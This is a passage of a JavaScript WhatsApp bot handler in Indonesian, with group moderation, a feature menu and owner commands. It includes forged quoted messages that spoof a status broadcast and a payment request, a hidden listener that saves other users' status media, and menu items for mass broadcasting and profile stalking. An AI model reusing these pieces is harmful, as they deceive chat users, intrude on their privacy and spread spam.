process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

const premium = JSON.parse(fs.readFileSync("./data/premium.json"))
const antilink = JSON.parse(fs.readFileSync("./data/antilink.json"))
const welcome = JSON.parse(fs.readFileSync("./data/welcome.json"))
const bljpm = JSON.parse(fs.readFileSync("./data/bljpm.json"))
const ownplus = JSON.parse(fs.readFileSync("./data/owner.json"))
const setbot = JSON.parse(fs.readFileSync("./data/bot.json"))
let domains = JSON.parse(fs.readFileSync("./data/domain.json"))
const list = JSON.parse(fs.readFileSync("./data/list.json"))
const channel = JSON.parse(fs.readFileSync("./data/channel.json"))
const stokdo = JSON.parse(fs.readFileSync("./data/stokdo.json"))
const script = JSON.parse(fs.readFileSync("./data/script.json"))


module.exports = async (sock, m, chat) => {
try {
const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : ""

const prefix = ''
let globalAutoAIStatus = false; 
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const chats = chat
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const crypto = require("crypto")
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await sock.decodeJid(sock.user.id)
const isOwner = m.sender.split("@")[0] == global.owner ? true : m.fromMe ? true : ownplus.includes(m.sender)
const isGrupReseller = premium.includes(m.chat)
const pushname = m.pushName || `${m.sender.split("@")[0]}`
const isBot = botNumber.includes(m.sender)
const func = require('../server/utils.js')

// >~~~~~~~ Metadata Groups ~~~~~~~~< //

try {
m.isGroup = m.chat.endsWith("g.us");
m.metadata = m.isGroup ? await sock.groupMetadata(m.chat).catch(_ => {}) : {};
const participants = m.metadata?.participants || [];
m.isAdmin = Boolean(participants.find(e => e.admin !== null && e.id === m.sender));
m.isBotAdmin = Boolean(participants.find(e => e.admin !== null && e.id === botNumber));
} catch (error) {
m.metadata = {};
m.isAdmin = false;
m.isBotAdmin = false;
}

// >~~~~~~~~~ Database ~~~~~~~~~~~< //

if (!isCmd) {
let check = list.find(e => e.cmd == m.text.toLowerCase())
if (check) {
await m.reply(check.respon)
}}

// >~~~~~~~~ Fake Quoted ~~~~~~~~~~< //

const qpay = {key: {remoteJid: '0@s.whatsapp.net', fromMe: false, id: `ownername`, participant: '0@s.whatsapp.net'}, message: {requestPaymentMessage: {currencyCodeIso4217: "USD", amount1000: 999999999, requestFrom: '0@s.whatsapp.net', noteMessage: { extendedTextMessage: { text: `${namaowner}`}}, expiryTimestamp: 999999999, amount: {value: 91929291929, offset: 1000, currencyCode: "USD"}}}}

const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `Powered By ${namaowner}`}}}

const qjasajpm = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `Jasa Jpm By ${namaowner}`}}}

const qcmd = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

// >~~~~~~~~~~ Function ~~~~~~~~~~~< //

const example = async (teks) => {
const commander = ` *Contoh Command :*\n*${cmd}* ${teks}`
return m.reply(commander)
}

if (isCmd) {
console.log(chalk.white.bgBlue.bold("[ Message Notification ]"), chalk.blue.bold(`\nSender : `), chalk.blue.bold(`${m.sender.split("@")[0]}`), chalk.blue.bold(`\nMessage :`), chalk.blue.bold(`${cmd}`), "\n")
}

if (m.isGroup && antilink.find(i => i.id == m.chat)) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(chats) && !isOwner && !m.isAdmin && m.isBotAdmin && !m.fromMe) {
var gclink = (`https://chat.whatsapp.com/` + await sock.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let room = antilink.find(i => i.id == m.chat)
let delet = m.key.participant
let bang = m.key.id
await sock.sendMessage(m.chat, {text: `
*🔍 Link Grup Terdeteksi!*

Maaf, ${room.kick == true ? "Kamu akan saya kik" : "pesan kamu saya hapus"}, karena admin/owner bot telah mengaktifkan fitur *Antilink Grup*!
`, mentions: [m.sender]}, {quoted: m})
await sock.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
if (room.kick == true) {
await func.sleep(1000)
await sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

    const momentt = require('moment-timezone')
momentt.tz.setDefault("Asia/Jakarta")
const autohariFile = path.join('./database', 'autohari.json')
if (!fs.existsSync(autohariFile)) {
  fs.mkdirSync(path.dirname(autohariFile), { recursive: true })
  fs.writeFileSync(autohariFile, JSON.stringify({}, null, 2))
}
let autohariDB = JSON.parse(fs.readFileSync(autohariFile))
function saveAutohari() {
  fs.writeFileSync(autohariFile, JSON.stringify(autohariDB, null, 2))
}
async function checkAutoHari(m) {
  const dayOfWeek = momentt().format('dddd').toLowerCase()  
  const groupData = autohariDB[m.chat]
  if (groupData?.[dayOfWeek]?.active) {
    const groupMetadata = await sock.groupMetadata(m.chat)
    const mentions = groupMetadata.participants.map(p => p.id)
    let message = `Selamat hari ${dayOfWeek.charAt(0).toUpperCase() + dayOfWeek.slice(1)}!`
    if (dayOfWeek === 'senin') {
      message += "\nSemangat menjalani minggu baru, semoga hari ini penuh berkah dan produktif! 💪🌟"
    } else if (dayOfWeek === 'selasa') {
      message += "\nHari kedua, tetap semangat! 💼🚀"
    } else if (dayOfWeek === 'rabu') {
      message += "\nSudah di pertengahan minggu, semoga terus maju! 🎯💥"
    } else if (dayOfWeek === 'kamis') {
      message += "\nJangan lupa bersyukur, sudah hampir akhir minggu! 🌈💪"
    } else if (dayOfWeek === 'jumat') {
      message += "\nJumat berkah! 🎉 Semoga hari ini penuh kebaikan. 💖"
    } else if (dayOfWeek === 'sabtu') {
      message += "\nAkhir minggu, saatnya untuk rileks dan recharge! 🌸🌞"
    } else if (dayOfWeek === 'minggu') {
      message += "\nSelamat beristirahat dan semoga bisa recharge untuk minggu depan! 🌷✨"
    }
    await sock.sendMessage(m.chat, {
      text: message,
      mentions: mentions
    })
  }
}
    
    const SESSION_FILE = "./session/ai_sessions.json";

let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};

function saveSession() {

    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));

}
    
  

    
    
 
  const promoRegex = /(chat\.whatsapp\.com|t\.me\/|discord\.gg|wa\.me\/|bit\.ly|linktr\.ee)/i
  if (promoRegex.test(text)) {
    let user = m.sender
    let data = db.data.chats[m.chat].antipromosi
    if (!data.count[user]) data.count[user] = 1
    else data.count[user]++
    if (data.count[user] >= 3) { // ubah aja max kick
      await sock.sendMessage(m.chat, {
        text: `@${user.split('@')[0]} dikeluarkan karena promosi lebih dari 3x.`,
        mentions: [user]
      })
      await sock.groupParticipantsUpdate(m.chat, [user], 'remove')
      delete data.count[user]
    } else {
      await sock.sendMessage(m.chat, {
        text: `@${user.split('@')[0]} jangan promosi di sini! (${data.count[user]}/3)`,
        mentions: [user]
      })
      await sock.sendMessage(m.chat, { delete: m.key })
    }
  }
    
    
    // Auto Download Status WhatsApp Terbaru

sock.autoDownloadStatusDariBiyu = false

sock.ev.on('messages.upsert', async ({ messages }) => {

   try {

      for (let msg of messages) {

         if (!msg.message) continue

         const mtype = Object.keys(msg.message || {})[0]

         const isStatus = msg.key.remoteJid === 'status@broadcast'

         const media = (mtype === 'imageMessage' || mtype === 'videoMessage') ? msg.message[mtype] : null

         if (sock.autoDownloadStatusDariBiyu && isStatus && media) {

            let filePath = await sock.downloadAndSaveMediaMessage(media)

            if (mtype === 'imageMessage') {

               await sock.sendMessage(sock.user.id, {

                  image: { url: filePath },

                  caption: `📥 Status gambar dari @${msg.pushName || msg.participant || msg.key.participant || 'unknown'}`

               }, { quoted: msg })

            } else if (mtype === 'videoMessage') {

               await sock.sendMessage(sock.user.id, {

                  video: { url: filePath },

                  caption: `📥 Status video dari @${msg.pushName || msg.participant || msg.key.participant || 'unknown'}`

               }, { quoted: msg })

            }

         }

      }

   } catch (err) {

      console.error('[AUTO STATUS ERROR]', err)

   }

})
// >~~~~~~~~~ Command ~~~~~~~~~~< //
    
switch (command) {
case "menuu": case "no": {
const textnya = ` 
 Hii @${m.sender.split("@")[0]} 👋
 Selamat ${func.ucapan()}
 
 *━ Information Bot*
  ▢ Botname : *${namabot}*
  ▢ Mode : *${sock.public ? "Public" : "Self"}*
‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
  ╭─▧ *Mainmenu*
  │ • .qc
  │ • .ai
  │ • .gpt
  │ • .sticker
  │ • .swm
  │ • .readqr
  │ • .tourl
  │ • .ttstalk
  │ • .igstalk
  │ • .removebg
  │ • .remini
  ╰ • .tohd

  ╭─▧ *Shoopmenu*
  │ • .buypanel
  │ • .buyadp
  │ • .buyreseller
  │ • .buyscript
  │ • .buydigitalocean
  │ • .buyvps
  │ • .buypulsa
  │ • .buykuota
  │ • .buysaldo
  │ • .topupml
  │ • .topupff
  ╰ • .topuppubg

  ╭─▧ *Downloadmenu*
  │ • .tiktok
  │ • .ytplay
  │ • .ytmp3
  │ • .ytmp4
  │ • .gitclone
  │ • .instagram
  │ • .xnxx
  │ • .videy
  ╰ • .facebook

  ╭─▧ *Searchmenu*
  │ • .pinterest
  │ • .yts
  │ • .gimage
  │ • .xnxxs
  │ • .tiktoks
  ╰ • .npm

  ╭─▧ *Groupmenu*
  │ • .antilink
  │ • .bljpm
  │ • .welcome
  │ • .buatgc
  │ • .kick
  │ • .promote
  │ • .demote
  │ • .hidetag
  │ • .close/open
  │ • .resetlink
  │ • .leave
  ╰ • .tagall

  ╭─▧ *Channelmenu*
  │ • .cekidch
  │ • .reactch
  │ • .addidch
  │ • .listidch
  │ • .delidch
  │ • .jpmch
  ╰ • .joinch

  ╭─▧ *Storemenu*
  │ • .pushkontak
  │ • .pushkontak2
  │ • .listgc
  │ • .addrespon
  │ • .delrespon
  │ • .listrespon
  │ • .done
  │ • .proses
  │ • .jpmtesti
  │ • .jpm
  │ • .jpmht
  │ • .gantipwvps
  │ • .installpanel
  │ • .startwings
  ╰ • .subdomain

  ╭─▧ *Panelmenu*
  │ • .addakses
  │ • .delakses
  │ • .listakses
  │ • .1gb - unlimited
  │ • .cadmin
  │ • .listpanel
  │ • .listadmin
  │ • .delpanel
  │ • .deladmin
  ╰ • .clearserver
  
  ╭─▧ *Cloudflaremenu*
  │ • .adddomaincf
  │ • .listdomaincf
  │ • .deldomaincf
  ╰ • .clearallsubdo

  ╭─▧ *Ownermenu*
  │ • .addstokdo
  │ • .delstokdo
  │ • .liststokdo
  │ • .addscript
  │ • .delscript
  │ • .getscript
  │ • .listscript
  │ • .adddomain
  │ • .deldomain
  │ • .listdomain
  │ • .addowner
  │ • .delowner
  │ • .listowner
  │ • .setppbot
  │ • .delppbot
  │ • .restart
  │ • .delsampah
  │ • .getcase
  │ • .getip
  ╰ • .backupsc
  
  ╭─▧ *Setbotmenu*
  │ • .autoread
  │ • .autoreadsw
  │ • .autotyping
  │ • .autorecording
  ╰ • .anticall

  ╭─▧ *Fitur Tambahan*
  │ • rch (react ch teks)
  │ • hitam
  │ • cecan
  │ • cogan
  │ • waifu
  │ • plays
  │ • foto (pin)
  │ • 95 (masa smp)
  │ • upchv1 idch|teks
  │ • reactch (pake emoji)
  │ • getpp
  │ • ambilsw
  │ • tourl2
  │ • roast (roasting org)
  │ • meme
  │ • jarak
  │ • auto hari (on/off
  │ • faceswap
  │ • lirik (cari lirik lagu)
  │ • colorize 
  │ • pantun (jenaka/cinta/kiasan)
  │ • rch1 (font1/font2/font3)
  │ • mitos
  │ • joke 
  │ • cekganteng
  │ • cekcantik 
  │ • cekimut
> Noisy
`
await sock.sendMessage(m.chat, {text: textnya, contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idsaluran,
   newsletterName: global.namasaluran
   }, 
externalAdReply: {
title: `© ${namabot} - v7.0.0`, 
body: `Powered by ${namaowner}.`, 
thumbnail: fs.readFileSync("./media/menu.jpg"),
renderLargerThumbnail: true,
sourceUrl: global.linksaluran,
mediaType: 1
}
}
}, {quoted: null})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buatgc": {
if (!isOwner) return m.reply(msg.owner)
if (!q) return example("nama grup")
let res = await sock.groupCreate(q, [])
const urlGrup = "https://chat.whatsapp.com/" + await sock.groupInviteCode(res.id)
let teks = `
*Grup WhatsApp Berhasil Dibuat ✅*
${urlGrup}
`
return m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "addakses": case "addaksesgc": {
if (!isOwner) return m.reply(msg.owner)
if (!m.isGroup) return m.reply(msg.group)
const input = m.chat
if (premium.includes(input)) return m.reply(`Grup ini sudah di beri akses reseller panel!`)
premium.push(input)
await fs.writeFileSync("./data/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menambah grup reseller panel ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delakses": case "delaksesgc": {
if (!isOwner) return m.reply(msg.owner)
if (premium.length < 1) return m.reply("Tidak ada grup reseller panel")
if (!m.isGroup) return m.reply(msg.group)
let input = text ? text : m.chat
if (input == "all") {
premium.length = 0
await fs.writeFileSync("./data/premium.json", JSON.stringify(premium, null, 2))
return m.reply(`Berhasil menghapus semua grup reseller panel ✅`)
}
if (!premium.includes(input)) return m.reply(`Grup ini bukan grup reseller panel!`)
let posi = premium.indexOf(input)
